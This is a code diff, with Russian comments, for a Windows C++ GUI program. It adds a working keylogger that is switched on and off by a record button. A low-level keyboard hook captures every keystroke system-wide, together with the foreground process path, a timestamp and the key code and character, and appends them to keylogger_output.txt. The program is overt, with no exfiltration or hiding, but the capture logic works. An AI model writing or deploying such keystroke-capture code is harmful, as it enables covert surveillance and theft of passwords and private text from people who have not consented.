@@ -141,9 +141,15 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
             // Меняем текст кнопки в зависимости от состояния
             if (isRecordStarted) {
                 SetWindowText(hwndRecordButton, L"Начать запись");
+
+                // Удаляем хук, если запись остановлена
+                RemoveKeyboardHook();
             }
             else {
                 SetWindowText(hwndRecordButton, L"Остановить запись");
+
+                // Устанавливаем хук, если запись начата
+                SetKeyboardHook();
             }
 
             // Переключаем состояние
@@ -394,5 +400,71 @@ void CreateFileInSelectedFolder(HWND hwnd) {
     }
     else {
         MessageBoxA(hwnd, "Выбор папки отменен.", "Отмена", MB_OK | MB_ICONINFORMATION);
+    }
+}
+
+
+// Процедура обработки хука клавиатуры
+LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
+    if (nCode == HC_ACTION) {
+        KBDLLHOOKSTRUCT* pKeyboard = (KBDLLHOOKSTRUCT*)lParam;
+
+        DWORD processId;
+        GetWindowThreadProcessId(GetForegroundWindow(), &processId);
+
+        // Получаем путь к процессу
+        wchar_t processPath[MAX_PATH];
+        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);
+        if (hProcess) {
+            DWORD pathLength = GetModuleFileNameExW(hProcess, NULL, processPath, MAX_PATH);
+            CloseHandle(hProcess);
+        }
+
+        // Получаем текущее время
+        time_t currentTime = time(NULL);
+        tm timeInfo;
+        localtime_s(&timeInfo, &currentTime);  // Используем localtime_s
+
+        wchar_t dateTime[100];
+        wcsftime(dateTime, sizeof(dateTime), L"%Y-%m-%d %H:%M:%S", &timeInfo);
+
+        // Записываем данные о нажатой клавише
+        KeyloggerRecord record;
+        record.processId = processId;
+        record.processPath = processPath;
+        record.dateTime = dateTime;
+        record.keyCode = pKeyboard->vkCode;
+        record.keyChar = pKeyboard->vkCode > 31 && pKeyboard->vkCode < 127 ? (char)pKeyboard->vkCode : 0;
+
+        keyloggerRecords.push_back(record);
+
+        // Записываем данные в файл с использованием std::wofstream
+        std::wofstream outFile(L"keylogger_output.txt", std::ios::app);
+        if (outFile.is_open()) {
+            outFile << record.processId << L";"
+                << record.processPath << L";"
+                << record.dateTime << L";"
+                << record.keyCode << L";"
+                << record.keyChar << std::endl;
+            outFile.close();
+        }
+    }
+
+    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
+}
+
+
+// Установка хука
+void SetKeyboardHook() {
+    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
+    if (!keyboardHook) {
+        MessageBox(NULL, L"Failed to install keyboard hook!", L"Error", MB_OK | MB_ICONERROR);
+    }
+}
+
+// Удаление хука
+void RemoveKeyboardHook() {
+    if (keyboardHook) {
+        UnhookWindowsHookEx(keyboardHook);
     }
 }
